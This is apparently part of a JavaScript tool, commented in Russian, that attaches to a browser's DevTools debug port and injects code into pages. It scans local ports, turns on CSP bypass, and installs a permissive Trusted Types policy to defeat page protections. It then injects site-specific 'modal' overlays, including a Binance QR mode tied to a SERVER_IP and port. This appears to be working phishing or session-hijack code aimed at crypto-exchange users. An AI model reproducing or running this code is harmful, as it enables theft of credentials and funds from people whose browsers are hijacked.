// ==================== ФУНКЦИЯ ИНЖЕКТА ====================
async function inject(wsUrl, modalCode) {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(wsUrl);
    let cmdId = 1;
    const timeout = setTimeout(() => {
      ws.close();
      reject(new Error('⏱️ Таймаут подключения'));
    }, 15000);

    ws.on('open', () => {
      console.log(`🔌 Подключено к: ${wsUrl}`);
      
      ws.send(JSON.stringify({ id: cmdId++, method: 'Runtime.enable' }));
      ws.send(JSON.stringify({ id: cmdId++, method: 'Page.setBypassCSP', params: { enabled: true } }));
      
      const trustedTypePolicy = `
        if (window.trustedTypes && window.trustedTypes.createPolicy) {
          try {
            if (!window.trustedTypes.defaultPolicy) {
              window.trustedTypes.createPolicy('default', {
                createHTML: (string) => string,
                createScript: (string) => string,
                createScriptURL: (string) => string
              });
            }
          } catch (e) {
            console.log('[TrustedTypes] Policy setup:', e.message);
          }
        }
      `;
      ws.send(JSON.stringify({ id: cmdId++, method: 'Runtime.evaluate', params: { expression: trustedTypePolicy, userGesture: true } }));
      
      ws.send(JSON.stringify({ id: cmdId++, method: 'Runtime.evaluate', params: { expression: modalCode, userGesture: true } }));
    });

    ws.on('message', (msg) => {
      try {
        const data = JSON.parse(msg);
        if (data.id) console.log(`📩 CDP [id:${data.id}]:`, JSON.stringify(data, null, 2));
        
        if (data.id === 4) {
          clearTimeout(timeout);
          if (data.error) {
            ws.close();
            reject(new Error(`❌ CDP Error: ${data.error.message}`));
          } else if (data.result && data.result.exceptionDetails) {
            ws.close();
            const err = data.result.exceptionDetails;
            reject(new Error(`❌ JS Exception: ${err.text}`));
          } else {
            console.log('✅ Модалка инжектирована!');
            ws.close();
            resolve(data.result);
          }
        }
      } catch (e) {
        console.error('❌ Ошибка парсинга:', e);
      }
    });

    ws.on('error', (err) => {
      clearTimeout(timeout);
      reject(new Error(`🔥 WebSocket error: ${err.message}`));
    });

    ws.on('close', () => console.log('🔌 WebSocket закрыт'));
  });
}

// ==================== ПОИСК АКТИВНОГО ПОРТА ====================
async function findActiveBrowserPort(preferredPort = null) {
  if (preferredPort) {
    try {
      const res = await fetch(`http://127.0.0.1:${preferredPort}/json`, {
        signal: AbortSignal.timeout(1200)
      });
      if (res.ok) {
        console.log(`[PORT] Успех на ${preferredPort}`);
        return preferredPort;
      }
    } catch (err) {
      console.log(`[PORT] ${preferredPort} недоступен: ${err.message}`);
    }
    throw new Error(`Браузер на порту ${preferredPort} недоступен`);
  }

  for (const port of DEBUG_PORTS) {
    try {
      const res = await fetch(`http://127.0.0.1:${port}/json`, {
        signal: AbortSignal.timeout(1200)
      });
      if (res.ok) {
        console.log(`[PORT] Успех на ${port}`);
        return port;
      }
    } catch (err) {
      console.log(`[PORT] ${port} недоступен: ${err.message}`);
    }
  }
  throw new Error(`Нет доступных браузеров на портах: ${DEBUG_PORTS.join(', ')}`);
}

// ==================== ПОЛУЧЕНИЕ КОДА МОДАЛКИ ====================
function getModalCode(site, mode, params = {}) {
  if (!modals[site]) return null;
  
  const siteModals = modals[site];
  
  if (typeof siteModals === 'string') return siteModals;
  if (typeof siteModals === 'function') return siteModals(SERVER_IP, SERVER_PORT);
  
  if (typeof siteModals === 'object') {
    if (site === 'binance' && mode === 'qr' && typeof siteModals.qr === 'function') {
      return siteModals.qr(SERVER_IP, SERVER_PORT);
    }
    if (siteModals[mode]) return siteModals[mode];
    const modeWithoutUnderscore = mode.replace('_', '');
    if (siteModals[modeWithoutUnderscore]) return siteModals[modeWithoutUnderscore];
    if (siteModals.default) return siteModals.default;
  }
  
  return null;
}

